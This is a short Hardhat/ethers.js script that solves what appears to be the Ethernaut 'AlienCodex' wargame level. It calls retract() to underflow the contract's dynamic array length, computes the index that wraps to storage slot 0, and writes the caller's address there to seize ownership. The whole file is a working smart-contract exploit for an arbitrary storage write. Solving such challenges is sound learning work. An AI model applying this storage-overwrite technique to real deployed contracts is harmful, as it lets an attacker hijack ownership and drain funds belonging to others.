import { ethers } from "hardhat";

async function main() {
  const [signer] = await ethers.getSigners();
  const alienCodex = await ethers.getContractAt("AlienCodex", "0x6FC81c077De2402725EbEe1ba9Ce3FF2Cd23EFD9");

  let tx = await alienCodex.make_contact();
  await tx.wait(3);

  tx = await alienCodex.retract();
  await tx.wait(3);

  const slot = ethers.constants.MaxUint256.sub(ethers.BigNumber.from(ethers.utils.keccak256(ethers.utils.hexZeroPad("0x01", 32)))).add(1);
  tx = await alienCodex.revise(slot, ethers.utils.hexZeroPad(signer.address, 32));
  await tx.wait(1);

  console.log("done!");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
